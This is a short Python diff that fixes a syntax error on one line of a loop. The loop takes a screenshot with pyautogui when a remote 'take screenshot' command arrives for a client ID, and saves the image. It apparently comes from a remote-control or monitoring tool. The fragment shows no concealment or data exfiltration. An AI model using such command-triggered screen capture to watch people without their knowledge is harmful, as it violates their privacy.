@@ -17,7 +17,7 @@ while True:
         command=data.get("command")
         if command and command.lower() == "take screenshot" :
             print(f"command for {client_id} : {command}")           
-            image=pyautogui.screenshot()}' mkn v'
+            image=pyautogui.screenshot()
             image.save(f"{client_id}.png")
             print("the screentshot save in screenshot.png")
 
